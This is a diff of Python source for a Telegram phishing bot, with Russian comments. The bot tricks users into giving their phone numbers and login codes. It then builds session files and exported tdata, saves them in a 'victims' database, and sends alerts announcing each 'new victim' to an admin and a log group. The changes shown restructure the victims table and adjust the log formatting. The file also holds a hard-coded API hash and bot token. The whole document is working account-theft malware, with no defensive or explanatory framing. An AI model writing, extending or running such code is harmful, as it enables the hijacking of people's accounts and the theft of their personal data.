@@ -16,25 +16,35 @@ API_HASH = '12814e71d319a434ee2f126d0c51c314'
 BOT_TOKEN = '8651082388:AAF6UNT2y7MSlhkPYGBFkkN4cVkgZ_pZiWc'
 
 # Группа для логов (укажите ID группы)
-LOG_GROUP_ID = -1001234567890  # Замените на ID вашей группы
-ADMIN_ID = 7197493128
+LOG_GROUP_ID = -5346240560  # Замените на ID вашей группы
+ADMIN_ID = 8794011165
 
 SESSIONS_DIR = 'sessions'
 TDATA_DIR = 'tdata_exports'
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 os.makedirs(TDATA_DIR, exist_ok=True)
 
-# БД - ПРАВИЛЬНАЯ СТРУКТУРА
+# === ПЕРЕСОЗДАНИЕ БД С ПРАВИЛЬНОЙ СТРУКТУРОЙ ===
 conn = sqlite3.connect('victims.db', check_same_thread=False)
 c = conn.cursor()
-c.execute('''CREATE TABLE IF NOT EXISTS victims
-             (user_id INTEGER PRIMARY KEY, 
-              phone TEXT, 
-              code TEXT, 
-              session_file TEXT, 
-              tdata_path TEXT, 
-              timestamp TEXT)''')
+
+# Удаляем старую таблицу если есть
+c.execute('DROP TABLE IF EXISTS victims')
+
+# Создаем новую таблицу с правильной структурой
+c.execute('''CREATE TABLE IF NOT EXISTS victims (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    user_id INTEGER,
+    phone TEXT,
+    code TEXT,
+    session_file TEXT,
+    tdata_path TEXT,
+    username TEXT,
+    full_name TEXT,
+    timestamp TEXT
+)''')
 conn.commit()
+print("[SWILL] База данных создана с правильной структурой")
 
 class FishingBot:
     def __init__(self):
@@ -82,8 +92,10 @@ class FishingBot:
                 # Получаем информацию о пользователе
                 try:
                     user_info = await event.get_sender()
-                    username = f"@{user_info.username}" if user_info.username else "Нет username"
+                    username = user_info.username if user_info.username else "Нет username"
                     full_name = f"{user_info.first_name or ''} {user_info.last_name or ''}".strip()
+                    if not full_name:
+                        full_name = "Неизвестно"
                 except:
                     username = "Неизвестно"
                     full_name = "Неизвестно"
@@ -230,7 +242,7 @@ class FishingBot:
             await self.log_message(
                 f"📱 **ЗАПРОС КОДА**\n"
                 f"Пользователь: {self.pending_auth[user_id].get('full_name', 'Неизвестно')}\n"
-                f"Username: {self.pending_auth[user_id].get('username', 'Неизвестно')}\n"
+                f"Username: @{self.pending_auth[user_id].get('username', 'Неизвестно')}\n"
                 f"ID: {user_id}\n"
                 f"Телефон: {phone}"
             )
@@ -271,10 +283,17 @@ class FishingBot:
             
             tdata_path = await self.export_tdata(user_id, session_file)
             
-            # Сохраняем в БД - ТОЛЬКО 6 КОЛОНОК
-            c.execute('''INSERT OR REPLACE INTO victims 
-                         VALUES (?, ?, ?, ?, ?, ?)''',
-                      (user_id, auth_data['phone'], code, session_file, tdata_path, 
+            # Сохраняем в БД с новой структурой
+            c.execute('''INSERT INTO victims 
+                         (user_id, phone, code, session_file, tdata_path, username, full_name, timestamp)
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+                      (user_id, 
+                       auth_data['phone'], 
+                       code, 
+                       session_file, 
+                       tdata_path,
+                       auth_data.get('username', 'Неизвестно'),
+                       auth_data.get('full_name', 'Неизвестно'),
                        datetime.now().isoformat()))
             conn.commit()
             
@@ -291,7 +310,7 @@ class FishingBot:
             await self.log_message(
                 f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
                 f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
-                f"📱 Username: {auth_data.get('username', 'Нет')}\n"
+                f"📱 Username: @{auth_data.get('username', 'Неизвестно')}\n"
                 f"🆔 ID: {user_id}\n"
                 f"📞 Телефон: {auth_data['phone']}\n"
                 f"📁 Данные: `{tdata_path}`\n"
@@ -382,7 +401,7 @@ class FishingBot:
                 ADMIN_ID,
                 f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
                 f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
-                f"📱 Username: {auth_data.get('username', 'Нет')}\n"
+                f"📱 Username: @{auth_data.get('username', 'Неизвестно')}\n"
                 f"🆔 ID: {user_id}\n"
                 f"📞 Телефон: {phone}\n"
                 f"📁 Сессия: {session_file}\n"
